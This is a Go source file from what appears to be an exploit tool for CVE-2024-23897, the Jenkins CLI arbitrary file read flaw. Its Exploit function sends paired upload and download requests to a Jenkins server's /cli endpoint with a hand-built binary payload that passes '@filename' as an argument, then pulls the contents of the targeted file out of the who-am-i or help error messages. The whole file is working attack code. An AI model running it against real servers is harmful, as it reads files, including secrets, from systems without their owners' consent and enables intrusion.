package scanner

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"github.com/google/uuid"
	"github.com/projectdiscovery/retryablehttp-go"
	stringsutil "github.com/projectdiscovery/utils/strings"
	"github.com/wjlin0/CVE-2024-23897/pkg/input"
	"github.com/wjlin0/CVE-2024-23897/pkg/output"
	"io"
	"regexp"
	"sync"
	"time"
)

var u, _ = uuid.NewRandom()

func (s *Scanner) Exploit(target *input.Target, filename string, command string, need bool) (result *output.ResultEvent) {
	uid := u.String()
	urlpath := fmt.Sprintf("%s/cli?remoting=false", target.ToString())
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		time.Sleep(1000 * time.Millisecond) // 确保 download 请求先于 upload 请求
		request, _ := retryablehttp.NewRequest("POST", urlpath, bytes.NewBuffer(parseRequestData(command, filename, need)))
		request.Header.Add("Session", uid)
		request.Header.Add("Side", "upload")
		_, _ = s.Do(request)
	}()

	go func() {
		defer wg.Done()
		request, _ := retryablehttp.NewRequest("POST", urlpath, nil)
		request.Header.Add("Session", uid)
		request.Header.Add("Side", "download")
		resp, err := s.Do(request)
		if err != nil {
			return
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return
		}
		if len(body) > 7 && bytes.HasPrefix(body[1:len(body)-1], []byte{0x00, 0x00}) && bytes.HasSuffix(body[1:len(body)-1], []byte{0x00, 0x00, 0x00, 0x04, 0x04, 0x00, 0x00, 0x00}) {

			result = &output.ResultEvent{
				Port: target.Port,
				Host: target.Host,
				URL:  target.ToString(),
			}
			data, err := parseResponseData(body[1 : len(body)-1])
			if err != nil {
				return
			}
			switch command {
			case "who-am-i":
				if !stringsutil.ContainsAny(string(data), "java -jar jenkins-cli.jar who-am-i") {
					return
				}

				rg := whoamiCommandRegexData.FindStringSubmatch(string(data))
				if len(rg) > 1 {
					data = []byte(rg[1])
				}
			case "help":
				if !stringsutil.ContainsAny(string(data), "java -jar jenkins-cli.jar help") {
					return
				}
				rg := helpCommandRegexData.FindStringSubmatch(string(data))
				if len(rg) > 1 {
					data = []byte(rg[1])
				}
			}

			result.Response = string(data)
			result.Filename = filename

		}
	}()

	wg.Wait()

	return
}

var whoamiCommandRegexData = regexp.MustCompile(`ERROR: (?:No argument is allowed: )? ?((?:No such file: )?.*)\njava -jar jenkins-cli.jar who-am-i`)
var helpCommandRegexData = regexp.MustCompile(`ERROR: (?:Too many arguments: )?((?:No such file: )?.*)\njava -jar jenkins-cli.jar help`)

func parseResponseData(data []byte) ([]byte, error) {
	var datas []byte
	if len(data) < 7 {
		return nil, fmt.Errorf("invalid length: %d", len(data))
	}
	for len(data) >= 7 {
		if string(data[:7]) == "\x00\x00\x00\x04\x04\x00\x00" {
			break
		}

		data = data[2:]
		lengthBytes := data[:2]

		// 将 lengthBytes 转换为 10 进制
		length := binary.BigEndian.Uint16(lengthBytes)
		if int(length)+3 > len(data) {
			return nil, fmt.Errorf("invalid length: exceeds available data")
		}

		datas = append(datas, data[3:3+length]...)
		data = data[3+length:]
	}
	return datas, nil
}

func parseRequestData(command string, filename string, need bool) []byte {
	//dataBytes := []byte{
	//	0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x04, 0x68, 0x65, 0x6c, 0x70,
	//}

	dataBytes := []byte{}
	commandBytes := []byte{0x00, 0x00}
	commandLength := len(command)
	commandBytes = append(commandBytes, []byte{byte((commandLength + 2) >> 8), byte((commandLength + 2) & 0xff)}...)
	commandBytes = append(commandBytes, 0x00)
	commandBytes = append(commandBytes, []byte{byte(commandLength >> 8), byte(commandLength & 0xff)}...)
	commandBytes = append(commandBytes, []byte(command)...)

	fileBytes := []byte{}
	if command == "help" && need {
		fileBytes = append(fileBytes, 0x00, 0x00)
		filenameLength := len("1")
		fileBytes = append(fileBytes, []byte{byte((filenameLength + 2) >> 8), byte((filenameLength + 2) & 0xff)}...)
		fileBytes = append(fileBytes, 0x00)
		fileBytes = append(fileBytes, []byte{byte(filenameLength >> 8), byte(filenameLength & 0xff)}...)
		fileBytes = append(fileBytes, []byte("1")...)
	}
	if filename != "" {
		fileBytes = append(fileBytes, 0x00, 0x00)
		filename = fmt.Sprintf("@%s", filename)
		filenameLength := len(filename)
		fileBytes = append(fileBytes, []byte{byte((filenameLength + 2) >> 8), byte((filenameLength + 2) & 0xff)}...)
		fileBytes = append(fileBytes, 0x00)
		fileBytes = append(fileBytes, []byte{byte(filenameLength >> 8), byte(filenameLength & 0xff)}...)
		fileBytes = append(fileBytes, []byte(filename)...)
	}

	dataBytes = append(dataBytes, commandBytes...)
	dataBytes = append(dataBytes, fileBytes...)
	dataBytes = append(dataBytes, 0x00, 0x00, 0x00, 0x05, 0x02, 0x00, 0x03, 0x47, 0x42, 0x4b, 0x00, 0x00, 0x00, 0x07, 0x01, 0x00, 0x05, 0x7a, 0x68, 0x5f, 0x43, 0x4e, 0x00, 0x00, 0x00, 0x00, 0x03)
	return dataBytes
}
